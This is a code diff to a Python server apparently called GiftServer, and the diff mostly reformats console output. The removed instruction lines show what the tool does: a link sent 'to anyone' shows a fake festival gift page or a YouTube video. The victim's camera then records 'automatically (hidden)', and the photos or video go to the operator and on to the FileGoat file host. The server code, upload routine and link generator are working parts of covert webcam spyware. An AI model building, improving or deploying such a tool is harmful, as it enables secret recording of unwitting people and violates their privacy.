@@ -68,16 +68,6 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
     filename = filepath.name
     file_size = filepath.stat().st_size
 
-    print()
-    print("=" * 50)
-    print("☁️ FILEGOAT UPLOAD")
-    print("=" * 50)
-    print(f"📁 File     : {filename}")
-    print(f"📊 Size     : {file_size:,} bytes")
-    print(f"⏰ Expiry   : {expiry_days} days")
-    print(f"🔄 Extend   : {extend_on_view}")
-    print()
-
     upload_url = "https://filego.at/api/file/upload"
     bucket_url = "https://filego.at/api/bucket"
 
@@ -114,9 +104,6 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
                     content_type
                 )
             }
-
-            print("⬆️ Step 1: Uploading file to FileGoat...")
-
             response = requests.post(
                 upload_url,
                 files=files,
@@ -124,13 +111,7 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
                 timeout=600
             )
 
-        print(f"📡 Step 1 HTTP Status: {response.status_code}")
-
         if response.status_code != 200:
-            print("❌ File upload failed")
-            print("Server response:")
-            print(response.text[:1000])
-
             return {
                 "success": False,
                 "error": f"HTTP {response.status_code}",
@@ -140,7 +121,6 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
         try:
             upload_result = response.json()
         except ValueError:
-            print("⚠️ Server did not return JSON")
             return {
                 "success": False,
                 "error": "Server returned non-JSON response",
@@ -167,7 +147,6 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
         bucket_headers = headers.copy()
         bucket_headers["Content-Type"] = "application/json"
 
-        print("📦 Step 2: Creating bucket...")
         bucket_response = requests.post(
             bucket_url,
             json=bucket_payload,
@@ -175,11 +154,7 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
             timeout=30
         )
 
-        print(f"📡 Step 2 HTTP Status: {bucket_response.status_code}")
-
         if bucket_response.status_code != 200:
-            print("❌ Bucket creation failed")
-            print("Server response:", bucket_response.text[:1000])
             return {
                 "success": False,
                 "error": f"HTTP {bucket_response.status_code}",
@@ -198,12 +173,6 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
 
         cloud_url = f"https://filego.at/bucket/{slug}"
 
-        print()
-        print("✅ UPLOAD SUCCESS")
-        print(f"🔗 URL: {cloud_url}")
-        print(f"⏰ Expires: {expiry_days} days")
-        print()
-
         return {
             "success": True,
             "url": cloud_url,
@@ -214,17 +183,12 @@ def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
         }
 
     except requests.exceptions.Timeout:
-        print("❌ Upload timed out")
         return {"success": False, "error": "Upload timeout"}
 
     except requests.exceptions.ConnectionError as e:
-        print("❌ Internet connection error")
-        print(e)
         return {"success": False, "error": "Connection error"}
 
     except Exception as e:
-        print("❌ Upload error:")
-        print(e)
         return {"success": False, "error": str(e)}
 
 # ============================================
@@ -288,11 +252,6 @@ def upload_media():
             'delete_url': None
         }
         
-        # ============================================
-        # Upload to FileGoat
-        # ============================================
-        print(f"\n📥 Received file: {safe_name}")
-        
         # Get expiry from request or use default
         expiry_days = request.form.get('expiry', str(FILEGOAT_EXPIRY_DAYS))
         try:
@@ -314,24 +273,22 @@ def upload_media():
                 'url': cloud_result.get('url'),
                 'expires': cloud_result.get('expiry')
             })
-            
-            print(f"   ☁️ Cloud link: {cloud_result.get('url')}")
-        else:
-            print(f"   ⚠️ Cloud upload failed: {cloud_result.get('error', 'Unknown error')}")
         
         received_files.append(file_info)
         
-        # Display received info
-        print(f"\n📹 Received {media_type} {len(received_files)}")
-        print(f"   📁 {safe_name}")
-        print(f"   📊 {file_info['size']:,} bytes")
-        print(f"   📂 Full path: {file_info['path']}")
-        
+        # Clean, well-aligned display output
+        print("\n" + "=" * 55)
+        print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
+        print("=" * 55)
+        print(f"  📁 File:       {safe_name}")
+        print(f"  📊 Size:       {file_info['size']:,} bytes")
+        print(f"  📂 Local Path: {file_info['path']}")
         if file_info.get('cloud_url'):
-            print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
-            print(f"   ⏰ Expires: {file_info['expires']}")
+            print(f"  ☁️ Cloud Link: {file_info['cloud_url']}")
+            print(f"  ⏰ Expires:    {file_info['expires']}")
         else:
-            print(f"   ⚠️ Not uploaded to cloud")
+            print(f"  ⚠️ Cloud Link: Upload failed ({cloud_result.get('error', 'Unknown error')})")
+        print("=" * 55)
         
         return jsonify({
             'success': True,
@@ -567,38 +524,14 @@ class GiftServer:
         print("✅ Server running")
 
     def wait_for_files(self):
-        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
-        print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
-        print("☁️ Files will be uploaded to FileGoat cloud")
-        print("-"*50)
-        print("\n⏳ Waiting for first file...")
-        print("💡 Files will NOT auto-open. Check the folder or cloud links.")
+        print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
+        print(f"📁 Local Folder:  {UPLOAD_FOLDER.absolute()}")
+        print(f"☁️ Cloud Service: FileGoat ({FILEGOAT_EXPIRY_DAYS} days auto-expiry)")
+        print("=" * 60)
         
         try:
-            last_count = 0
             while self.running:
-                current_count = len(received_files)
-                
-                if current_count > last_count:
-                    file_info = received_files[-1]
-                    print(f"\n📹 Received {file_info['type']} {current_count}")
-                    print(f"   📁 {file_info['filename']}")
-                    print(f"   📊 {file_info['size']:,} bytes")
-                    print(f"   📂 Full path: {file_info['path']}")
-                    
-                    if file_info.get('cloud_url'):
-                        print(f"   ☁️ FileGoat link: {file_info['cloud_url']}")
-                        print(f"   ⏰ Expires: {file_info['expires']}")
-                    else:
-                        print(f"   ⚠️ Not uploaded to cloud")
-                    
-                    print("\n   💡 To download from cloud, use the link above")
-                    print(f"   📁 Or open locally: cd {UPLOAD_FOLDER}")
-                    last_count = current_count
-                    print(f"\n⏳ Waiting for next file...")
-                
                 time.sleep(1)
-                
         except KeyboardInterrupt:
             print("\n\n👋 Shutting down...")
 
@@ -646,52 +579,21 @@ class GiftServer:
             # Generate link
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
             
-            print("\n" + "="*60)
+            print("\n" + "=" * 60)
             print(f"📤 SHARE THIS LINK ({mode_name}):")
-            print("="*60)
-            print(f"\n🔗 {link}")
-            print("\n" + "="*60)
+            print("=" * 60)
+            print(f"\n🔗 {link}\n")
+            print("=" * 60)
             
             print("\n📋 Configuration Summary:")
-            print(f"   🎯 Mode: {mode_name}")
-            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
-            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
-            
+            print(f"   🎯 Mode:         {mode_name}")
+            print(f"   📷 Camera:       {'Front' if camera == 'user' else 'Back'}")
+            print(f"   📸 Capture:      {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
+            print(f"   ☁️ Cloud Expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
             if mode == 'festival':
-                print(f"   🎊 Festival Name: {name}")
+                print(f"   🎊 Festival:     {name}")
             else:
-                print(f"   🎬 Video ID: {video_id}")
-            
-            print("\n📋 Instructions:")
-            if mode == 'festival':
-                print("   1. Send the link above to anyone")
-                print("   2. They see a festival/gift page")
-                print("   3. They click 'Open Your Gift'")
-                print("   4. Camera records automatically (hidden)")
-                if capture_mode == 'video':
-                    print(f"   5. Records {duration} second video")
-                else:
-                    print(f"   5. Captures {photos} photos")
-                print("   6. Files upload to FileGoat cloud!")
-            else:
-                print("   1. Send the link above to anyone")
-                print("   2. They see a YouTube video playing")
-                print("   3. Camera records automatically (hidden)")
-                if capture_mode == 'video':
-                    print(f"   4. Records {duration} second video")
-                else:
-                    print(f"   4. Captures {photos} photos")
-                print("   5. Files upload to FileGoat cloud!")
-            
-            print(f"\n☁️ FileGoat: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
-            print("   Links will be shown when files are received")
-            
-            print("\n💡 Files saved locally too. Check the folder:")
-            print(f"   📁 cd {UPLOAD_FOLDER}")
-            print("="*60)
-            print("\n📋 Link printed above - copy it manually")
-            print(f"📁 Files saved in: {UPLOAD_FOLDER.absolute()}")
+                print(f"   🎬 Video ID:     {video_id}")
             
             self.wait_for_files()
             
